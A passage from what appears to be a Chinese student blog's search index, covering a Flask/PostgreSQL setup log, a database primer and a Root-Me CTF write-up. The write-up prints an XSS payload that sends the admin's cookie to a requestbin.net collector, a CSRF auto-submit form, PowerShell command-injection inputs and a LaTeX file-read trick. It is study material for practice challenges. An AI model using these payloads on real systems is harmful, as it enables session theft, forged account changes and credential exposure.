toml-0.10.2-py2.py3-none-any.whl (16 kB)Collecting packaging Using cached packaging-21.0-py3-none-any.whl (40 kB)Collecting attrs&amp;gt;=19.2.0 Using cached attrs-21.2.0-py2.py3-none-any.whl (53 kB)Collecting pluggy&amp;lt;2.0,&amp;gt;=0.12 Downloading pluggy-1.0.0-py2.py3-none-any.whl (13 kB)Collecting iniconfig Downloading iniconfig-1.1.1-py2.py3-none-any.whl (5.0 kB)Collecting py&amp;gt;=1.8.2 Downloading py-1.10.0-py2.py3-none-any.whl (97 kB) |████████████████████████████████| 97 kB 9.2 MB/s Collecting urllib3&amp;lt;1.27,&amp;gt;=1.21.1 Downloading urllib3-1.26.7-py2.py3-none-any.whl (138 kB) |████████████████████████████████| 138 kB 15.4 MB/s Collecting charset-normalizer~=2.0.0; python_version &amp;gt;= &quot;3&quot; Downloading charset_normalizer-2.0.6-py3-none-any.whl (37 kB)Collecting idna&amp;lt;4,&amp;gt;=2.5; python_version &amp;gt;= &quot;3&quot; Downloading idna-3.2-py3-none-any.whl (59 kB) |████████████████████████████████| 59 kB 19.1 MB/s Collecting certifi&amp;gt;=2017.4.17 Downloading certifi-2021.5.30-py2.py3-none-any.whl (145 kB) |████████████████████████████████| 145 kB 18.0 MB/s Collecting pyparsing&amp;gt;=2.0.2 Using cached pyparsing-2.4.7-py2.py3-none-any.whl (67 kB)Installing collected packages: toml, pyparsing, packaging, attrs, pluggy, iniconfig, py, pytest, urllib3, charset-normalizer, idna, certifi, requestsSuccessfully installed attrs-21.2.0 certifi-2021.5.30 charset-normalizer-2.0.6 idna-3.2 iniconfig-1.1.1 packaging-21.0 pluggy-1.0.0 py-1.10.0 pyparsing-2.4.7 pytest-6.2.5 requests-2.26.0 toml-0.10.2 urllib3-1.26.7Collecting mypy Downloading mypy-0.910-cp38-cp38-manylinux2010_x86_64.whl (22.8 MB) |████████████████████████████████| 22.8 MB 3.4 MB/s Collecting flake8 Downloading flake8-3.9.2-py2.py3-none-any.whl (73 kB) |████████████████████████████████| 73 kB 4.9 MB/s Collecting mypy-extensions&amp;lt;0.5.0,&amp;gt;=0.4.3 Downloading mypy_extensions-0.4.3-py2.py3-none-any.whl (4.5 kB)Requirement already satisfied: toml in ./venv/lib/python3.8/site-packages (from mypy) (0.10.2)Requirement already satisfied: typing-extensions&amp;gt;=3.7.4 in ./venv/lib/python3.8/site-packages (from mypy) (3.10.0.2)Collecting pyflakes&amp;lt;2.4.0,&amp;gt;=2.3.0 Downloading pyflakes-2.3.1-py2.py3-none-any.whl (68 kB) |████████████████████████████████| 68 kB 15.4 MB/s Collecting mccabe&amp;lt;0.7.0,&amp;gt;=0.6.0 Downloading mccabe-0.6.1-py2.py3-none-any.whl (8.6 kB)Collecting pycodestyle&amp;lt;2.8.0,&amp;gt;=2.7.0 Downloading pycodestyle-2.7.0-py2.py3-none-any.whl (41 kB) |████████████████████████████████| 41 kB 1.9 MB/s Installing collected packages: mypy-extensions, mypy, pyflakes, mccabe, pycodestyle, flake8Successfully installed flake8-3.9.2 mccabe-0.6.1 mypy-0.910 mypy-extensions-0.4.3 pycodestyle-2.7.0 pyflakes-2.3.1Collecting wheel Downloading wheel-0.37.0-py2.py3-none-any.whl (35 kB)Installing collected packages: wheelSuccessfully installed wheel-0.37.0msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ source venv/bin/activate(venv) msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ 两行代码完成环境配置。接下来设置 sql 权限，只需要设置一次即可，之后启动虚拟机不需要重新设置。(venv) msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ sudo pg_createcluster 13 mainCreating new PostgreSQL cluster 13/main .../usr/lib/postgresql/13/bin/initdb -D /var/lib/postgresql/13/main --auth-local peer --auth-host md5Les fichiers de ce système de bases de données appartiendront à l&#39;utilisateur « postgres ».Le processus serveur doit également lui appartenir.L&#39;instance sera initialisée avec la locale « fr_FR.UTF-8 ».L&#39;encodage par défaut des bases de données a été configuré en conséquenceavec « UTF8 ».La configuration de la recherche plein texte a été initialisée à « french ».Les sommes de contrôle des pages de données sont désactivées.correction des droits sur le répertoire existant /var/lib/postgresql/13/main... okcréation des sous-répertoires... oksélection de l&#39;implémentation de la mémoire partagée dynamique...posixsélection de la valeur par défaut pour max_connections... 100sélection de la valeur par défaut pour shared_buffers... 128MBsélection du fuseau horaire par défaut... Europe/Pariscréation des fichiers de configuration... oklancement du script bootstrap...okexécution de l&#39;initialisation après bootstrap... oksynchronisation des données sur disque... okSuccès. Vous pouvez maintenant lancer le serveur de bases de données en utilisant : pg_ctlcluster 13 main startVer Cluster Port Status Owner Data directory Log file13 main 5432 down postgres /var/lib/postgresql/13/main /var/log/postgresql/postgresql-13-main.log(venv) msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ sudo su - postgrespostgres@msi:~$postgres@msi:~$ pg_lsclustersVer Cluster Port Status Owner Data directory Log file13 main 5432 down postgres /var/lib/postgresql/13/main /var/log/postgresql/postgresql-13-main.logpostgres@msi:~$ pg_ctlcluster 13 main startWarning: the cluster will not be running as a systemd service. Consider using systemctl: sudo systemctl start postgresql@13-mainpostgres@msi:~$ createuser -s msipostgres@msi:~$ createdb -O msi msipostgres@msi:~$ exitdéconnexion(venv) msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ psqlpsql (13.4 (Ubuntu 13.4-1.pgdg20.04+1))Saisissez « help » pour l&#39;aide.msi=# (venv) msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ make runbranch=$(git rev-parse --abbrev-ref HEAD)rev=$(git log -1|head -1|cut -d&#39; &#39; -f2)date=$(git log -1 --date=iso8601 | sed -n 3p | cut -c 9-27 | tr &#39; &#39; &#39;Z&#39;)echo -n &quot;$branch $rev $date&quot; &amp;gt; VERSIONcreatedb kivapsql -f drop.sql -f create.sql -f data.sql kiva | tee .postgresexport FLASK_APP=app.py FLASK_ENV=developmentexport APP_CONFIG=&#39;pg.conf&#39;flask run --host=&quot;0.0.0.0&quot; &amp;gt;&amp;gt; app.log 2&amp;gt;&amp;amp;1 &amp;amp;echo $! &amp;gt; app.pid(venv) msi@msi:~/Desktop/TP_Kiva/kiva/back-end$ curl -i -X GET http://0.0.0.0:5000/versionHTTP/1.0 200 OKContent-Type: application/jsonContent-Length: 318Server: Werkzeug/2.0.2 Python/3.8.10Date: Thu, 07 Oct 2021 12:41:29 GMT{ &quot;app&quot;: &quot;kiva&quot;, &quot;auth&quot;: &quot;none&quot;, &quot;branch&quot;: &quot;master&quot;, &quot;commit&quot;: &quot;595a4e9eee1d9ffec6fd8f182f706e9dcb6f77ba&quot;, &quot;date&quot;: &quot;2021-10-04Z16:35:39&quot;, &quot;db&quot;: &quot;postgres&quot;, &quot;now&quot;: &quot;Thu, 07 Oct 2021 12:41:29 GMT&quot;, &quot;started&quot;: &quot;2021-10-07 14:40:52.741970&quot;, &quot;user&quot;: null, &quot;variant&quot;: &quot;anodb&quot;, &quot;version&quot;: 5}" }, { "title": "数据库 - 全面理解 Database 数据库", "url": "/posts/Backend-programing-copy/", "categories": "Blogging, Study", "tags": "Backend, Python, Database", "date": "2021-10-07 20:18:00 +0800", "snippet": "1. 数据库 Databse (DB)在广义上，数据库（Databse，DB）可以定义为：任何相关信息的集合。数据库有各种不同的形式，号码簿可以认为是一个数据库，购物清单可以是一个数据库，你的五个最好的朋友的信息可以构成一个数据库，所有谷歌存储的用户信息也可以构成一个数据库。数据库也可以以多种方式保存，你可以写在纸上（购物清单），你可以记在你的脑子（你的五个最好的朋友），你可以存在计算机上（谷歌用户数据），你也可以用 PPT，EXCEL 等软件的形式保存下来。数据库由于其存储信息的功能，因此有多种属性，在这里我们比较一下两个数据库：Amazon.com 的用户数据和一个购物清单 数据库 Amazon.com 购物清单 数据内容 用户的历史记录、订单信息、评价、信用卡、收货地址、账号密码等等信息 购物时要购买的商品信息 数据量 需要存储千万级别的数据并且保证可以时刻读取 需要存储10-20个商品的数据并且保证可以时刻读取 信息重要性 对于亚马逊的运行来说是极度关键且重要的数据 为了方便购物而存储的信息，对于购物活动本身并不是必需的 安全性 存储有人们的个人信息，安全性十分重要 对安全性要求并不高 存储媒介 电脑 记录在纸上，甚至只保存在脑子里 计算机是目前最适合存储大规模数据库的媒介。而目前在信息领域常用的数据库，也特指保存在计算机上的数据库。所以在计算机领域，数据库是一个静态的概念，是一个存储在计算机内部、在内容上存在共性的数据集合。同时使用者根据数据重要性、数据量等的实际情况，对数据库的存储容量以及安全性等方面会有不同的要求。2. 数据库管理系统 Database Management Systems (DBMS)数据库管理系统（Database Management Systems，DBMS）则是一类可以帮助使用者创建和管理数据库的特殊的软件程序。在此，数据库管理系统就是一个动态的概念，涉及到对于数据库的变化。而根据我们对于数据库的需求，我们对于这类软件则也有一定的要求： 能够简单方便地管理海量数据 能够保证信息安全性，不会泄露信息 能够对重要信息进行备份 能够应对并发控制（多个用户同时对数据库进行修改的情况） 能够和其他的软件进行交互（比如可以使用编程语言进行调用） 注意，用户并不直接对数据库中的数据进行操作，而是对数据库管理系统提出指令，再由管理系统来操作数据库中的数据。3. C.R.U.D 数据库的四个主要操作我们对数据库管理系统下达的四个核心操作指令是：Create 创建， Read 读取， Update 更新， Delete 删除。任何优秀的数据库管理系统都需要能完成这四种操作。4. 两种主要的数据库类型数据库主要分为两种：关系型数据库 Relational Databases (SQL) 和 非关系型数据库 Non-Relational Databases (NoSQL / not just SQL)关系型数据库 Relational Databases (SQL)目前最常用的数据库类型，关系型数据库把数据整理在一个或多个表格（Table）上。 每一个表格都有行和列的概念 每一行都有唯一的键（Key）与之对应 非关系型数据库 Non-Relational Databases (NoSQL / not just SQL)把数据整理在任何不是传统表格的媒介上的数据库，我们称之为非关系型数据库。 键值对（Key-value stores） 文档（JSON，XML，etc） 图（Graphs） Flexible Tables 参考地址SQL Tutorial - Full Database Course for Beginners零基础入门MySQL（数据库） · 一MySQL万字总结！超详细！" }, { "title": "专业课 - 使用 Python 模拟量子计算电路", "url": "/posts/Simulation-quantum-computing-python/", "categories": "Blogging, Study", "tags": "Quantum computing, Python", "date": "2021-10-04 16:15:00 +0800", "snippet": "主要使用到的包为：qiskit量子计算Qiskit 量子计算模拟包Qiskit" }, { "title": "专业课 - 信息安全 - 在 ROOT ME 平台上挑战信息安全项目", "url": "/posts/MSI-cyber-security/", "categories": "Blogging, Study", "tags": "Cyber-security", "date": "2021-09-28 15:23:00 +0800", "snippet": "2021年9月28日，周二，专业课老师 Gorge 给我们在 ROOT ME 上开了一个竞赛，竞赛里提供了大量的计算机安全的题目来实践。题目的形式多样，但是最终目标都是获取一个 code， 在题目页面上的输入框输入该 code 就可以得分。Web - ClientJavascript - Authentification提示语：Login &amp;amp; pass ?进入题目的网站显示的是一个登录界面，直接查看源码即可。/* &amp;lt;![CDATA[ */function Login(){ var pseudo=document.login.pseudo.value; var username=pseudo.toLowerCase(); var password=document.login.password.value; password=password.toLowerCase(); if (pseudo==&quot;4dm1n&quot; &amp;amp;&amp;amp; password==&quot;sh.org&quot;) { alert(&quot;Password accepté, vous pouvez valider le challenge avec ce mot de passe.\\nYou an validate the challenge using this password.&quot;); } else { alert(&quot;Mauvais mot de passe / wrong password&quot;); }}/* ]]&amp;gt; */ Javascript - Authentification 2提示语：Oui oui, le javascript c’est très facile :)同样也是查看网站源码即可function connexion(){ var username = prompt(&quot;Username :&quot;, &quot;&quot;); var password = prompt(&quot;Password :&quot;, &quot;&quot;); var TheLists = [&quot;GOD:HIDDEN&quot;]; for (i = 0; i &amp;lt; TheLists.length; i++) { if (TheLists[i].indexOf(username) == 0) { var TheSplit = TheLists[i].split(&quot;:&quot;); var TheUsername = TheSplit[0]; var ThePassword = TheSplit[1]; if (username == TheUsername &amp;amp;&amp;amp; password == ThePassword) { alert(&quot;Vous pouvez utiliser ce mot de passe pour valider ce challenge (en majuscules) / You can use this password to validate this challenge (uppercase)&quot;); } } else { alert(&quot;Nope, you&#39;re a naughty hacker.&quot;) } }}点击 loggin 会出现两个弹窗，分别输入账号密码，就会告诉你 Flag 就是你输入的密码。XSS - Stockée 1提示语：Du gateau !ÉnoncéVolez le cookie de session de l’administrateur et utilisez le pour valider l’épreuve.涉及 XSS， 题目网站提供了类似于论坛留言板的界面，需要将代码注入留言板以获取管理员的 cookie 来解题。利用 https://requestbin.net/ 生成一个 http 服务器来接受访问请求知道服务器地址为 http://requestbin.net/r/5vds2u6y在留言板输入以下内容&amp;lt;script&amp;gt;document.write(&quot;&amp;lt;img src=https://requestbin.net/r/5vds2u6y?tk=&quot;+document.cookie+&quot; /&amp;gt;&quot;);&amp;lt;/script&amp;gt;等待机器人定时访问留言板即可https://www.cnblogs.com/li9club/p/12381847.html 生成服务器教程CSRF - 0 protection提示语：Cross-Site Request ForgeryÉnoncéActivez votre compte pour accéder à l’espace privé de l’intranet.官方参考：http://repository.root-me.org/Exploitation%20-%20Web/FR%20-%20les%20attaques%20CSRF.pdfhttp://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20CSRF:%20Attack%20and%20defense.pdfhttp://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20Cross-site%20Request%20Forgery%20CSRF.pdfhttps://requestbin.net/解题：点击 Register 注册一个账号，如 attacker，密码 123456。chrome 查看 POST 请求 https://stackoverflow.com/questions/15603561/how-can-i-debug-a-http-post-in-chrome看到这样一段代码&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Intranet&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;link rel=&#39;stylesheet&#39; property=&#39;stylesheet&#39; id=&#39;s&#39; type=&#39;text/css&#39; href=&#39;/template/s.css&#39; media=&#39;all&#39; /&amp;gt;&amp;lt;iframe id=&#39;iframe&#39; src=&#39;https://www.root-me.org/?page=externe_header&#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;a href=&quot;?action=contact&quot;&amp;gt;Contact&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;?action=profile&quot;&amp;gt;Profile&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;?action=private&quot;&amp;gt;Private&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;?action=logout&quot;&amp;gt;Logout&amp;lt;/a&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;div&amp;gt; &amp;lt;fieldset&amp;gt;&amp;lt;legend&amp;gt;Update Profile&amp;lt;/legend&amp;gt; &amp;lt;form action=&quot;?action=profile&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&amp;gt; &amp;lt;div class=&quot;form-group&quot;&amp;gt; &amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;attacker&quot;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt; &amp;lt;div class=&quot;form-group&quot;&amp;gt; &amp;lt;label&amp;gt;Status:&amp;lt;/label&amp;gt; &amp;lt;input type=&quot;checkbox&quot; name=&quot;status&quot; disabled &amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt; &amp;lt;button type=&quot;submit&quot;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt;&amp;lt;/fieldset&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;div&amp;gt;You&#39;re not an admin!&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;写一段，主要思路是让 admin 打开收件箱之后到 http://challenge01.root-me.org/web-client/ch22/?action=profile 这个界面，然后自动执行对攻击者账号的 validation 的 POST 界面。&amp;lt;form name=&quot;csrf&quot; action=&quot;http://challenge01.root-me.org/web-client/ch22/?action=profile&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;attacker&quot;&amp;gt; &amp;lt;!-- 激活账号，根据实际修改 --&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;on&quot;&amp;gt; &amp;lt;!-- 激活动作 --&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;script&amp;gt;document.csrf.submit()&amp;lt;/script&amp;gt;参考：https://www.douban.com/note/714091211/https://exp-blog.com/safe/ctf/rootme/web-client/csrf-0-protection/App - ScriptPowershell - Command injection[Press Shift-F1 for help]Host/IP or ssh:// URL [localhost]: ssh://app-script-ch18:app-script-ch18@challenge05Connecting to ssh://app-script-ch18@challenge05:22load pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directory _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\| ___| / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |___ \\| (__| | | | (_| | | | __/ | | | (_| | __/ |_| |___) | \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/|____/ |___/ root-me.orgConvertFrom-SecureString : The data protection operation was unsuccessful.This may have been caused by not having the user profile loaded for thecurrent thread&#39;s user context, which may be the case when the thread isimpersonating.+ ~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [ConvertFrom-SecureString], Cr yptographicException + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept ion,Microsoft.PowerShell.Commands.ConvertFromSecureStringCommandTable to dump:&amp;gt; ;lsConnect to the database With the secure Password: . Backup the table Directory: C:\\cygwin64\\challenge\\app-script\\ch18Mode LastWriteTime Length Name---- ------------- ------ -----a---- 4/20/2020 10:50 AM 18 .passwd-a---- 4/21/2020 11:37 AM 314 ch18.ps1Table to dump:&amp;gt;&amp;gt; ;Get-content .passwdConnect to the database With the secure Password: . Backup the tableSecureIEXpasswordTable to dump:&amp;gt;Powershell - SecureString[Press Shift-F1 for help]Host/IP or ssh:// URL [localhost]: ssh://app-script-ch19:app-script-ch19@challenge05Connecting to ssh://app-script-ch19@challenge05:22load pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directory _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\| ___| / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |___ \\| (__| | | | (_| | | | __/ | | | (_| | __/ |_| |___) | \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/|____/ |___/ root-me.orgTable to dump:&amp;gt;&amp;gt; ;lsConnect to the database With the secure Password: System.Security.SecureString.Backup the table Directory: C:\\cygwin64\\challenge\\app-script\\ch19Mode LastWriteTime Length Name---- ------------- ------ -----a---- 10/29/2020 9:27 AM 361 .passwd.crypt-a---- 10/29/2020 9:23 AM 176 AES.key-a---- 10/29/2020 9:30 AM 331 ch19.ps1Table to dump:&amp;gt;&amp;gt; ;Get-Content .passwd.cryptConnect to the database With the secure Password: System.Security.SecureString.Backup the table76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQARQBqAEEARQBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAANwA3ADIAYgBkADYANgAyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYANgBkAGYAYgAxAGMAMgAwADUANQBkADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYAMAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAyADkATable to dump:&amp;gt;&amp;gt; ;Get-content AES.keyConnect to the database With the secure Password: System.Security.SecureString.Backup the table342356342542221122342543323313427653543Table to dump:&amp;gt; ;Get-content ch19.ps1Connect to the database With the secure Password: System.Security.SecureString.Backup the table$KeyFile = &quot;AES.key&quot;$key = Get-Content $KeyFile$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Keywhile($true){ Write-Host &quot;Table to dump:&quot; Write-Host -NoNewLine &quot;&amp;gt; &quot; $table=Read-Host iex &quot;Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table&quot;}Table to dump:&amp;gt;&amp;gt; ;$KeyFile = &quot;AES.key&quot;Connect to the database With the secure Password: System.Security.SecureString.Backup the tableTable to dump:&amp;gt; ;$Key = Get-content $KeyFileConnect to the database With the secure Password: System.Security.SecureString.Backup the tableTable to dump:&amp;gt; ;Get-Content .passwd.crypt | ConvertTo-SecureString -key $KeyConnect to the database With the secure Password: System.Security.SecureString.Backup the tableSystem.Security.SecureStringTable to dump:&amp;gt; ;$Cred = New-Object -TypeName System.Management.Automation.PSCredential ` -ArgumentList &quot;app-script-ch19&quot;, (Get-Content .passwd.crypt | ConvertTo-SecureString -Key $key)Connect to the database With the secure Password: System.Security.SecureString.Backup the tableTable to dump:&amp;gt;&amp;gt; ;$Cred.GetNetworkCredential().PasswordConnect to the database With the secure Password: System.Security.SecureString.Backup the tableSecureStringBypassTable to dump:&amp;gt;https://www.cnblogs.com/sparkdev/archive/2017/08/01/7258507.htmlhttps://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/https://adamtheautomator.com/powershell-get-credential/LaTeX - Input提示语：Introduction à LaTeXÉnoncéSavez-vous comment fonctionne la commande input ?官方参考：Latex GlobalLatex Cheat SheetLatex Guide解题进入靶机后的欢迎界面没有任何有用信息。[Press Shift-F1 for help]Host/IP or ssh:// URL [localhost]: ssh://app-script-ch23:app-script-ch23@challenge02Connecting to ssh://app-script-ch23@challenge02:22load pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directory _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\___ \\ / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |__) || (__| | | | (_| | | | __/ | | | (_| | __/ |_| / __/ \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/_____| |___/ root-me.org ██▒ ▒██░ ░███░ █ █ ░███▒ ░███░ ▓ ███░ ▓█▓ ▓█░ ▓ ▓███ ██▒ ░▓█▓███ ▓ ██ █▒ ░██ ██ ███ ▒░ ▓░████░██ ▓█░ ██ ▒██ ███ ░▓██ ▒█ ██ ░█░ ░██ ▓█ ░█████████████ █ ██░ █▓ ██ █ ░██ ██ ██ ░ ░██▓ ██ ██ ███ ░██▓░███ ███ ▒█ ▓██▓ ░████ █▓ ░████ ░██ ▒█ ▓█████░ ███ ███▓ ▓███ █████░ ████ ▓█ ░██▓░ ▒████████░ ██ ▓█ ██░▒██████████████████░ ██ ▓█ ███▓██▒ ░██████████░ ██ ▓█ ░████▒ ██ ░██▓ ▒█▓ ▒██░ ▒██░ ██ ▒█ ██▓ █▒ █ █▒ ░█ █░ █▓ █ █████████████████████ ████████████▄ ██ ███ ███ ██ ██ ▄████████▄ ▄████████▄ ██████ ████ ████ ▄████████▄ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████▀ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████ ██ ███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ▀████████▀ ▀████████▀ ██ ██ █ ██ ▀██████████------------------------------------------------------------------------------------------------ Welcome on challenge02 /-----------------------------‘/tmp and /var/tmp are writeableValidation password is stored in $HOME/.passwdUseful commands available: python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2Attention: Publishing solutions publicly (blog, github, youtube, etc.) is forbidden. Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.查看文件可知， .passwd 为 flag ， setuid-wrapper 应该是主程序， ch23 是另一个脚本程序。app-script-ch23@challenge02:~$ lltotal 668drwxr-x--- 2 app-script-ch23-cracked app-script-ch23 4096 Mar 16 2021 ./drwxr-xr-x 23 root root 4096 Aug 18 21:10 ../-r-------- 1 app-script-ch23-cracked app-script-ch23-cracked 93 Mar 3 2021 .passwd-r-xr-x--- 1 app-script-ch23-cracked app-script-ch23 893 Mar 16 2021 ch23.sh*-rwsr-x--- 1 app-script-ch23-cracked app-script-ch23 661788 Mar 16 2021 setuid-wrapper*-r--r----- 1 app-script-ch23-cracked app-script-ch23 262 Mar 16 2021 setuid-wrapper.c查看 setuid-wrapper.c 这个文件#include &amp;lt;unistd.h&amp;gt;/* setuid script wrapper */int main(int arc, char** arv) { char *argv[] = { &quot;/bin/bash&quot;, &quot;-p&quot;, &quot;/challenge/app-script/ch23/ch23.sh&quot;, arv[1] , NULL }; setreuid(geteuid(), geteuid()); execve(argv[0], argv, NULL); return 0;}再查看 ch23.sh#!/usr/bin/env bashif [[ $# -ne 1 ]]; then echo &quot;Usage : ${0} TEX_FILE&quot;fiif [[ -f &quot;${1}&quot; ]]; then TMP=$(mktemp -d) cp &quot;${1}&quot; &quot;${TMP}/main.tex&quot; # Compilation echo &quot;[+] Compilation ...&quot; timeout 5 /usr/bin/pdflatex \\ -halt-on-error \\ -output-format=pdf \\ -output-directory &quot;${TMP}&quot; \\ -no-shell-escape \\ &quot;${TMP}/main.tex&quot; &amp;gt; /dev/null timeout 5 /usr/bin/pdflatex \\ -halt-on-error \\ -output-format=pdf \\ -output-directory &quot;${TMP}&quot; \\ -no-shell-escape \\ &quot;${TMP}/main.tex&quot; &amp;gt; /dev/null chmod u+w &quot;${TMP}/main.tex&quot; rm &quot;${TMP}/main.tex&quot; chmod 750 -R &quot;${TMP}&quot; if [[ -f &quot;${TMP}/main.pdf&quot; ]]; then echo &quot;[+] Output file : ${TMP}/main.pdf&quot; else echo &quot;[!] Compilation error, your logs : ${TMP}/main.log&quot; fielse echo &quot;[!] Can&#39;t access file ${1}&quot;fi通过参考一些网络上的文章，明白了主要思路就是写一个 LaTex 的源文件，然后在源文件里使用 input 函数来显示 .passwd 的内容。首先需要一个 LaTex 源文件。使用 vim 直接新建一个 LaTex 的源文件并不可行，因为文件不可写入。于是根据 ch23.sh 文件内的代码发现一个可以用的指令 mktemp，经过查阅发现这个指令用于创建一个临时文件。app-script-ch23@challenge02:~$ mktemp/tmp/tmp.mprfMcooq7创建了一个路径为 /tmp/tmp.mprfMcooq7 的临时文件。通过代码 vim /tmp/tmp.mprfMcooq7 使用 vim 对这个文件进行编辑，并且复制进以下 LaTex 源码。\\documentclass{article}\\begin{document}\\input{/challenge/app-script/ch23/.passwd}\\end{document}Esc + :wq 成功保存。编译app-script-ch23@challenge02:~$ ./setuid-wrapper /tmp/tmp.mprfMcooq7[+] Compilation ...[+] Output file : /tmp/tmp.jrJqLGOTOg/main.pdf现在得到了 main.pdf 这个文件，里面应该有 input 进来的 .passwd 文件里的内容。打开自己的终端，把这个 pdf 下载过来C:\\Users\\Stone&amp;gt;scp -P 